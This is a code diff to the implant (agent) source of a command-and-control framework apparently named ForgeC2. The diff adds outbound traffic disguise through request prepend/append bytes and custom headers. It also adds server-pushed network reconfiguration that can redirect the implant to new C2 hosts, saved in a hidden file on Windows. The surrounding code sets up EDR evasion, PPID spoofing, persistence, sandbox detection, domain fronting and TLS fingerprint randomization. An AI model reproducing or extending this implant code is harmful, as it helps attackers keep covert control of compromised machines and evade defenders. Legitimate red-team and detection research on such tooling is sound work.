@@ -9,59 +9,68 @@ import (
 	"encoding/base64"
 	"encoding/hex"
 	"encoding/json"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
 	"time"
+
+	"github.com/forgec2/forgec2/pkg/protocol"
 )
 
 // These variables are injected at compile time via -ldflags "-X main.C2URL=..."
 // This source is used exclusively by the Generate Agent flow (EXE).
 // IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
 var (
-	C2URL                string   = s(SC2DefaultURL)
-	C2URLs               []string // parsed from C2URL (comma-separated multi-C2 failover)
-	currentC2Idx         int      // index of last working C2 server
-	IntervalStr          string   = "10"
-	JitterStr            string   = "20"
-	UserAgent            string   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-	PersistStr           string   = "false"
-	SkipTLSVerifyStr     string   = "false" // default secure; change to "true" for self-signed C2 certs
-	Protocol             string   = "http"  // "http" or "tcp" injected via ldflags
-	DebugStr             string   = "false" // set via ldflags for debug builds (stealth default false)
-	FastInterval         int      = 1       // Fast interval for screen monitoring (1 second)
-	BeaconURIStr         string   = s(SBeaconURI)
-	BeaconMethodStr      string   = s(SBeaconMethod)
-	ListenerIDStr        string   = "0"
-	P2PMode              string   = ""                            // "", "smb", "tcp"
-	P2PParent            string   = ""                            // parent agent to connect to (child mode)
-	P2PListenAddr        string   = ""                            // listen addr for children (parent mode)
-	DNSDomain            string   = ""                            // DNS C2 domain (e.g. "c2.example.com")
-	DNSServer            string   = ""                            // DNS C2 server IP
-	DNSDoHURL            string   = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
-	DNSDoTAddr           string   = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
-	DNSIPv6              bool     = false                         // enable IPv6 AAAA record tunneling
-	ProxyStr             string   = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
-	CryptoKeyStr         string   = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
-	BeaconKeyStr         string   = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
-	RegSecretIDStr       string   = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
-	RegSecretStr         string   = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
-	DomainFront          string   = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
-	ContentLengthJitter  int      = 0                             // Max random padding bytes for HTTP body (0=disabled)
-	MalleablePrepend     string   = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
-	MalleableAppend      string   = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
-	ExpiryDateStr        string   = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
-	EvasionStr           string   = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
-	PPIDSpoofStr         string   = "false"                       // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
-	PersistencePrefixStr string   = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
-	BeaconTransportStr   string   = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
-	ChameleonStr         string   = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
-	ChameleonProfileStr  string   = "random"                      // chrome, firefox, ios, android, random
-	SMBPipeName          string   = "forgec2"                     // named pipe name for SMB transport
-	IsSMBParentStr       string   = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
-	SSHUserStr           string   = "forgec2"                     // SSH username for SSH transport
-	SSHPasswordStr       string   = ""                            // SSH password for SSH transport
-	SSHKeyStr            string   = ""                            // base64-encoded PEM private key for SSH transport
-	SSHHostKeyStr        string   = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
-	EgressDetectionStr   string   = "false"                       // enable egress detection on startup
-	EgressPortsStr       string   = "80,443,8080,8443,53,22,2222" // ports to test for egress
+	C2URL                   string            = s(SC2DefaultURL)
+	C2URLs                  []string          // parsed from C2URL (comma-separated multi-C2 failover)
+	currentC2Idx            int               // index of last working C2 server
+	IntervalStr             string            = "10"
+	JitterStr               string            = "20"
+	UserAgent               string            = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+	PersistStr              string            = "false"
+	SkipTLSVerifyStr        string            = "false" // default secure; change to "true" for self-signed C2 certs
+	Protocol                string            = "http"  // "http" or "tcp" injected via ldflags
+	DebugStr                string            = "false" // set via ldflags for debug builds (stealth default false)
+	FastInterval            int               = 1       // Fast interval for screen monitoring (1 second)
+	BeaconURIStr            string            = s(SBeaconURI)
+	BeaconMethodStr         string            = s(SBeaconMethod)
+	ListenerIDStr           string            = "0"
+	P2PMode                 string            = ""                            // "", "smb", "tcp"
+	P2PParent               string            = ""                            // parent agent to connect to (child mode)
+	P2PListenAddr           string            = ""                            // listen addr for children (parent mode)
+	DNSDomain               string            = ""                            // DNS C2 domain (e.g. "c2.example.com")
+	DNSServer               string            = ""                            // DNS C2 server IP
+	DNSDoHURL               string            = ""                            // DNS-over-HTTPS endpoint (e.g. "https://dns.google/dns-query")
+	DNSDoTAddr              string            = ""                            // DNS-over-TLS address:port (e.g. "1.1.1.1:853")
+	DNSIPv6                 bool              = false                         // enable IPv6 AAAA record tunneling
+	ProxyStr                string            = ""                            // HTTP proxy URL (e.g. "http://proxy:8080")
+	CryptoKeyStr            string            = ""                            // 32-byte hex key for beacon payload encryption ("" = disabled)
+	BeaconKeyStr            string            = ""                            // pre-shared key used to derive registration auth ("" = no PSK auth)
+	RegSecretIDStr          string            = ""                            // v3: per-implant registration secret id ("" = v2 master-key derivation)
+	RegSecretStr            string            = ""                            // v3: per-implant registration secret, base64 ("" = v2 master-key derivation)
+	DomainFront             string            = ""                            // Domain fronting: override HTTP Host header ("" = disabled)
+	ContentLengthJitter     int               = 0                             // Max random padding bytes for HTTP body (0=disabled)
+	MalleablePrepend        string            = ""                            // bytes prepended to every HTTP beacon response body (server malleable profile)
+	MalleableAppend         string            = ""                            // bytes appended to every HTTP beacon response body (server malleable profile)
+	MalleableRequestPrepend string            = ""                            // bytes prepended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
+	MalleableRequestAppend  string            = ""                            // bytes appended to the agent's OUTGOING HTTP beacon body (server strips on inbound)
+	MalleableRequestHeaders map[string]string = nil                           // extra request headers sent on outbound beacons (e.g. Host/Cookie shaping)
+	ExpiryDateStr           string            = ""                            // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
+	EvasionStr              string            = "false"                       // Compile-time EDR evasion (chunked sleep); also FORGEC2_EVASION=1 at runtime
+	PPIDSpoofStr            string            = "false"                       // Compile-time PPID spoofing (spawned processes inherit explorer.exe as parent)
+	PersistencePrefixStr    string            = ""                            // Custom prefix for persistence artifacts (reg keys, task names, file names); default "ForgeC2"
+	BeaconTransportStr      string            = "http"                        // "http", "wss", "ssh" — transport protocol for beacon
+	ChameleonStr            string            = "true"                        // enable uTLS TLS fingerprint randomization (requires chameleon build tag)
+	ChameleonProfileStr     string            = "random"                      // chrome, firefox, ios, android, random
+	SMBPipeName             string            = "forgec2"                     // named pipe name for SMB transport
+	IsSMBParentStr          string            = "false"                       // "true" = this agent is an SMB parent (listens on pipe)
+	SSHUserStr              string            = "forgec2"                     // SSH username for SSH transport
+	SSHPasswordStr          string            = ""                            // SSH password for SSH transport
+	SSHKeyStr               string            = ""                            // base64-encoded PEM private key for SSH transport
+	SSHHostKeyStr           string            = ""                            // base64 server host public key (pin); empty = SSH transport refuses to connect
+	EgressDetectionStr      string            = "false"                       // enable egress detection on startup
+	EgressPortsStr          string            = "80,443,8080,8443,53,22,2222" // ports to test for egress
 
 	// Certificate pinning (SHA-256 hex of server DER cert; empty = disabled)
 	PinnedCertSHA256Str string = ""
@@ -117,12 +126,11 @@ var (
 	smbPipeName      string // resolved SMB pipe name (from SMBPipeName or extracted from C2URL)
 )
 
-var ecdhSess *ecdhSession      // ECDH session for forward-secret encryption (nil = not established)
-var beaconKey string           // parsed from BeaconKeyStr (PSK auth on all transports)
-var inSandbox bool             // set by sandbox detection at startup
-var ppidSpoofEnabled bool      // PPID spoofing enabled via ldfags
-var persistencePrefix string   // artifact name prefix for persistence (default "ForgeC2")
-var egressDetection bool       // parsed from EgressDetectionStr
+var ecdhSess *ecdhSession    // ECDH session for forward-secret encryption (nil = not established)
+var inSandbox bool           // set by sandbox detection at startup
+var ppidSpoofEnabled bool    // PPID spoofing enabled via ldfags
+var persistencePrefix string // artifact name prefix for persistence (default "ForgeC2")
+var egressDetection bool     // parsed from EgressDetectionStr
 var AgentVersion = s(SAgentVersion)
 var maxRetries int             // parsed from MaxRetriesStr
 var deadTimeout time.Duration  // parsed from DeadTimeoutStr
@@ -140,7 +148,7 @@ var (
 var killDateParsed time.Time // parsed from KillDateStr
 
 // agentConfigBlob mirrors the config keys produced by the server's
-// payload.buildConfigBlob. Empty values are ignored so injected config only
+// payload.buildConfigBlobKeyed. Empty values are ignored so injected config only
 // overrides non-default values and build-time defaults otherwise stand.
 type agentConfigBlob struct {
 	C2URL            string `json:"c2_url"`
@@ -181,6 +189,10 @@ type agentConfigBlob struct {
 	SelfCheckSHA256  string `json:"self_check"`
 	MalleablePrepend string `json:"malleable_prepend"`
 	MalleableAppend  string `json:"malleable_append"`
+	// Request-side transforms applied by the agent to outbound beacons.
+	MalleableRequestPrepend string            `json:"malleable_request_prepend"`
+	MalleableRequestAppend  string            `json:"malleable_request_append"`
+	MalleableRequestHeaders map[string]string `json:"malleable_request_headers"`
 }
 
 // loadConfigBlob decodes the injected runtime config block and reapplies it over
@@ -200,6 +212,12 @@ func loadConfigBlob() {
 		return
 	}
 	b.apply()
+	// Zeroize the decrypted plaintext blob now that its fields have been copied
+	// into the agent's config globals. The JSON text (which still contains every
+	// secret in cleartext) must not linger in the heap (C3).
+	for i := range plain {
+		plain[i] = 0
+	}
 }
 
 // decryptConfigBlob decrypts the runtime config blob (AES-256-GCM) using the
@@ -228,6 +246,120 @@ func decryptConfigBlob(blob string) []byte {
 		return nil
 	}
 	return plain
+}
+
+// validC2Schemes mirrors the authoritative prefix list enforced elsewhere
+// (see egress.go). A config-over-wire C2URL must use one of these schemes;
+// anything else is rejected rather than applied (defense-in-depth on top of the
+// already-authenticated decrypt).
+var validC2Schemes = []string{"http://", "https://", "tcp://", "tls://", "ssh://", "dns://", "smb://"}
+
+func hasValidC2Scheme(u string) bool {
+	for _, p := range validC2Schemes {
+		if strings.HasPrefix(u, p) {
+			return true
+		}
+	}
+	return false
+}
+
+// applyServerNetworkConfig decrypts and applies a server-delivered network
+// config (config-over-wire). The blob is AES-256-GCM under the per-implant
+// registration secret; only a server holding that secret could have produced it,
+// and the enclosing response frame is already MAC-authenticated. Non-empty
+// fields override the compile-time defaults. Per-field values are revalidated
+// before applying so a malformed or partially corrupt blob cannot steer the
+// agent at an unexpected target. The raw blob is persisted so the agent keeps
+// the operator's latest config across restarts without re-registering.
+func applyServerNetworkConfig(b64 string) {
+	if b64 == "" || RegSecretStr == "" {
+		return
+	}
+	secret, err := base64.StdEncoding.DecodeString(RegSecretStr)
+	if err != nil || len(secret) != 32 {
+		logDebug("[config] cannot derive network-config key (bad reg secret)")
+		return
+	}
+	nc, err := protocol.DecryptNetworkConfig(secret, b64)
+	if err != nil {
+		logDebug("[config] network config decrypt failed, keeping defaults")
+		return
+	}
+	c2URL := nc.C2URL
+	if c2URL != "" && !hasValidC2Scheme(c2URL) {
+		logDebug("[config] network config: skipping C2URL with invalid scheme")
+		c2URL = ""
+	}
+	b := agentConfigBlob{
+		C2URL:            c2URL,
+		Protocol:         nc.Protocol,
+		BeaconTransport:  nc.BeaconTransport,
+		UserAgent:        nc.UserAgent,
+		Proxy:            nc.Proxy,
+		SkipTLSVerify:    boolToStr(nc.SkipTLSVerify),
+		DNSDomain:        nc.DNSDomain,
+		DNSServer:        nc.DNSServer,
+		DomainFront:      nc.DomainFront,
+		MalleablePrepend: nc.MalleablePrepend,
+		MalleableAppend:  nc.MalleableAppend,
+		BeaconURI:        nc.BeaconURI,
+	}
+	if nc.RequestPrepend != "" {
+		b.MalleableRequestPrepend = nc.RequestPrepend
+	}
+	if nc.RequestAppend != "" {
+		b.MalleableRequestAppend = nc.RequestAppend
+	}
+	if nc.RequestHeaders != nil {
+		b.MalleableRequestHeaders = nc.RequestHeaders
+	}
+	// Only override sleep values when the server supplied authoritative ones;
+	// an agent's compile-time interval is left intact otherwise.
+	if nc.Interval > 0 {
+		b.Interval = strconv.Itoa(nc.Interval)
+	}
+	if nc.Jitter > 0 {
+		b.Jitter = strconv.Itoa(nc.Jitter)
+	}
+	b.apply()
+	reparseNetworkConfig()
+	if err := saveNetworkConfig(b64); err != nil {
+		logDebug("[config] failed to persist network config")
+	} else {
+		logDebug("[config] applied network config over wire")
+	}
+}
+
+// loadPersistedNetworkConfig re-applies a previously delivered network config
+// from disk (written by applyServerNetworkConfig) so the agent starts with the
+// operator's last-known config even before it re-registers.
+func loadPersistedNetworkConfig() {
+	if RegSecretStr == "" {
+		return
+	}
+	data, err := os.ReadFile(getBeaconStateFilePath("network_config"))
+	if err != nil {
+		return
+	}
+	applyServerNetworkConfig(strings.TrimSpace(string(data)))
+}
+
+func saveNetworkConfig(b64 string) error {
+	path := getBeaconStateFilePath("network_config")
+	if err := os.WriteFile(path, []byte(b64), 0o600); err != nil {
+		return err
+	}
+	if runtime.GOOS == "windows" {
+		setHidden(path)
+	}
+	return nil
+}
+
+func boolToStr(b bool) string {
+	if b {
+		return "true"
+	}
+	return "false"
 }
 
 func (b *agentConfigBlob) apply() {
@@ -344,5 +476,14 @@ func (b *agentConfigBlob) apply() {
 	}
 	if b.MalleableAppend != "" {
 		MalleableAppend = b.MalleableAppend
+	}
+	if b.MalleableRequestPrepend != "" {
+		MalleableRequestPrepend = b.MalleableRequestPrepend
+	}
+	if b.MalleableRequestAppend != "" {
+		MalleableRequestAppend = b.MalleableRequestAppend
+	}
+	if b.MalleableRequestHeaders != nil {
+		MalleableRequestHeaders = b.MalleableRequestHeaders
 	}
 }
